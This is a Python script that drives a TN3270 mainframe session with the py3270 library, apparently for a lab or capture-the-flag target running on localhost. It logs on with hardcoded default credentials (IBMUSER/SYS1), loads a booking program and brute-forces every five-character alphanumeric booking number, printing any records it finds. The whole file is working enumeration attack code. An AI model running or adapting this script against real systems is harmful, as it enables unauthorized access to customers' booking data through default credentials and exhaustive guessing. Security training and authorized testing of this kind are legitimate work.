import time
import string
import itertools
from py3270 import Emulator

BOOKING_NUMBER_CHARSET = string.ascii_uppercase + string.digits
em = Emulator(visible=True)
#em.connect('nusse.seatheworld.tld')
em.connect('127.0.0.1', 10023)

def login(username, password):
    em.send_string("LOGON " + username)
    em.send_enter()
    em.send_string(password)
    em.send_enter()
    em.send_string("LOAD IBMUSER.SEATW.LOAD(BOOKING)")
    em.send_enter()
    em.send_enter()

def check_booking_number(booking_number):
    em.send_string("1")
    em.send_enter()
    em.send_string(booking_number)
    em.send_enter()
    c = em.exec_command("Ascii")
    output = "\n".join([line.decode() for line in c.data])
    if "FOUND 0 RECORDS" in output:
        return False
    print("=" * 64)
    return output

login("IBMUSER", "SYS1")

# Make sure it works first
print("Checking if script works by looking for booking number: WJWQX")
result = check_booking_number("WJWQX")
if not result:
    print("ERROR: Booking number was not found...")
    exit(0)

print("OK, starting brute force!")
print()


i = 0
booking_numbers = list(itertools.product(BOOKING_NUMBER_CHARSET, repeat=5))
length = len(booking_numbers)

for i, booking_number in enumerate(booking_numbers):
    booking_number = "".join(booking_number)
    print("[{}/{}] Checking: {}".format(i + 1, length, booking_number))
    result = check_booking_number(booking_number)
    if result:
        print()
        print()
        print("Found valid booking number:", booking_number)
        print(result)
        print("=" * 32)

em.terminate()
print(em)
time.sleep(10)
em.terminate()
